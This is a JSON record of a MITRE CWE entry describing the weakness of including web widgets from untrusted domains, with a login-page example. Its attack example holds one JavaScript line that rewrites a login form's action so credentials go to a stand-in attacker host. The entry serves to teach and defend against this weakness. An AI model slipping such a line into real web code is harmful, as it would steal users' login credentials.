{
  "id": "830",
  "name": "Inclusion of Web Functionality from an Untrusted Source",
  "abstraction": "Variant",
  "structure": "Simple",
  "status": "Incomplete",
  "description": "The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source.",
  "extended_description": "\n            \u003cxhtml:p\u003eIncluding third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.\u003c/xhtml:p\u003e\n            \u003cxhtml:p\u003eEven if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.\u003c/xhtml:p\u003e\n            \u003cxhtml:p\u003eThis weakness is common in \"mashup\" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '\u0026lt;SCRIPT SRC=\"http://other.domain.here\"\u0026gt;' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.\u003c/xhtml:p\u003e\n            \u003cxhtml:p\u003eSuch dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.\u003c/xhtml:p\u003e\n         ",
  "related_weaknesses": [
    {
      "nature": "ChildOf",
      "cweid": "829",
      "view_id": "1000",
      "ordinal": "Primary"
    }
  ],
  "applicable_platforms": {},
  "modes_of_introduction": [
    {
      "phase": "Implementation",
      "note": [
        "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
      ]
    }
  ],
  "common_consequences": [
    {
      "scope": [
        "Confidentiality",
        "Integrity",
        "Availability"
      ],
      "impact": [
        "Execute Unauthorized Code or Commands"
      ]
    }
  ],
  "demonstrative_examples": [
    {
      "demonstrative_example_id": "DX-94",
      "text": "\n               \u003cIntro_Text\u003eThis login webpage includes a weather widget from an external website:\u003c/Intro_Text\u003e\n               \u003cExample_Code Nature=\"bad\" Language=\"HTML\"\u003e\n                  \u003cxhtml:div\u003e\u0026lt;div class=\"header\"\u0026gt; Welcome!\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;div id=\"loginBox\"\u0026gt;Please Login:\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\"\u0026gt;\u003cxhtml:br/\u003eUsername: \u0026lt;input type=\"text\" name=\"username\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;br/\u0026gt;\u003cxhtml:br/\u003ePassword: \u0026lt;input type=\"password\" name=\"password\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;input type=\"submit\" value=\"Login\" /\u0026gt;\u003cxhtml:br/\u003e\u0026lt;/form\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003cxhtml:br/\u003e\u0026lt;div id=\"WeatherWidget\"\u0026gt;\u003cxhtml:div style=\"margin-left:10px;\"\u003e\u0026lt;script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"\u0026gt;\u0026lt;/script\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003c/xhtml:div\u003e\u0026lt;/div\u0026gt;\u003c/xhtml:div\u003e\n               \u003c/Example_Code\u003e\n               \u003cBody_Text\u003eThis webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).\u003c/Body_Text\u003e\n               \u003cBody_Text\u003eFor example, user login information could easily be stolen with a single line added to weatherwidget.js:\u003c/Body_Text\u003e\n               \u003cExample_Code Nature=\"attack\" Language=\"JavaScript\"\u003e\n                  \u003cxhtml:div\u003e\n                     \u003cxhtml:br/\u003e\n                     \u003cxhtml:i\u003e...Weather widget code....\u003c/xhtml:i\u003e\n                     \u003cxhtml:br/\u003edocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";\u003c/xhtml:div\u003e\n               \u003c/Example_Code\u003e\n               \u003cBody_Text\u003eThis line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.\u003c/Body_Text\u003e\n            "
    }
  ],
  "references": [
    {
      "reference_id": "REF-778",
      "author": [
        "Jeremiah Grossman"
      ],
      "title": "Third-Party Web Widget Security FAQ",
      "url": "http://jeremiahgrossman.blogspot.com/2010/07/third-party-web-widget-security-faq.html"
    }
  ],
  "content_history": {
    "submission": {
      "submission_name": "CWE Content Team",
      "submission_organization": "MITRE",
      "submission_date": "2010-12-08T00:00:00Z"
    },
    "modification": [
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2011-06-01T00:00:00Z",
        "modification_comment": "updated Common_Consequences"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2011-06-27T00:00:00Z",
        "modification_comment": "updated Demonstrative_Examples"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2012-05-11T00:00:00Z",
        "modification_comment": "updated Demonstrative_Examples"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2017-11-08T00:00:00Z",
        "modification_comment": "updated Modes_of_Introduction, Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2019-06-20T00:00:00Z",
        "modification_comment": "updated Type"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2020-02-24T00:00:00Z",
        "modification_comment": "updated Relationships"
      },
      {
        "modification_name": "CWE Content Team",
        "modification_organization": "MITRE",
        "modification_date": "2021-10-28T00:00:00Z",
        "modification_comment": "updated Relationships"
      }
    ]
  }
}
